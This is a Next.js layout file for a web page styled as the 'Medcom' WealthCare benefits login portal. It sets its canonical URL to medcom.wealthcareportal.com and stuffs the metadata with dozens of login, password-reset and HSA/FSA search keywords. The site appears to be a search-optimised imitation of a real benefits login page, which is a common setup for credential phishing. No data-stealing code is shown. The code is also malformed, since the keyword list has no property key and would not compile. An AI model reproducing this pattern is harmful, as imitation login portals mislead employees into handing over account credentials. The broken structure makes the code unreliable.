import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import { MedcomHeader } from "@/components/medcom-header";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://medcom.wealthcareportal.com/Authentication/Handshake";
const SITE_DOMAIN = "medcom.wealthcareportal.com";
const SITE_BRAND = "Medcom";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "Medcom - Login",
    template: "%s | Medcom",
  },
  "Medcom",
  "Medcom login",
  "Medcom benefits",
  "Medcom benefits portal",
  "Medcom employee benefits",
  "Medcom employee portal",
  "Medcom participant portal",
  "Medcom employer portal",
  "Medcom secure login",
  "Medcom account access",
  "Medcom reimbursement account",
  "Medcom online account",
  "Medcom HSA login",
  "Medcom FSA login",
  "Medcom COBRA login",
  "Medcom participant login",
  "Medcom employer login",
  "Medcom benefits login",
  "Medcom WealthCare Portal",
  "WealthCare Portal",
  "WealthCare benefits portal",
  "WealthCare participant portal",
  "WealthCare employer portal",
  "WealthCare secure login",
  "WealthCare reimbursement portal",
  "medcom.wealthcareportal.com",
  "benefits login",
  "employee benefits login",
  "employee benefits portal",
  "secure benefits login",
  "participant portal login",
  "participant portal access",
  "employer portal login",
  "reimbursement account login",
  "account access login",
  "online benefits account login",
  "secure portal access",
  "health benefits",
  "health benefits login",
  "health savings account management",
  "online HSA portal",
  "HSA login",
  "secure HSA account login",
  "FSA login",
  "dependent care FSA login",
  "dependent care reimbursement account",
  "healthcare reimbursement account",
  "medical expense reimbursement portal",
  "reimbursement account",
  "COBRA login",
  "COBRA administration services",
  "COBRA continuation coverage portal",
  "employee benefits administration",
  "benefits administration services",
  "online employee benefits platform",
  "employer benefits management",
  "third-party benefits administrator",
  "secure employee benefits portal",
  "benefits management platform",
  "how to access my FSA account online",
  "how to submit reimbursement claims",
  "how to manage HSA online",
  "how to check HSA balance",
  "how to access employee benefits portal",
  "how to file reimbursement claims online",
  "how to use a reimbursement account",
  "eligible FSA expenses",
  "benefits portal login issues",
  "forgot benefits portal password",
  "secure employee portal access",
  "participant portal authentication help",
  "benefits portal password reset",
  "handshake authentication",
  "handshake authentication login",
  "secure portal authentication",
  "two-factor authentication benefits portal",
  "employee portal verification",
  "secure reimbursement account access",
  "participant portal security",
  "account recovery portal login"
],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,

  authors: [{ name: "Medcom" }],
  creator: "Medcom",
  publisher: "Medcom",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "Medcom - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "Medcom - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Medcom.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "Medcom sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your Medcom profile.",
  publisher: {
    "@type": "Organization",
    name: "Medcom",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        <MedcomHeader />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
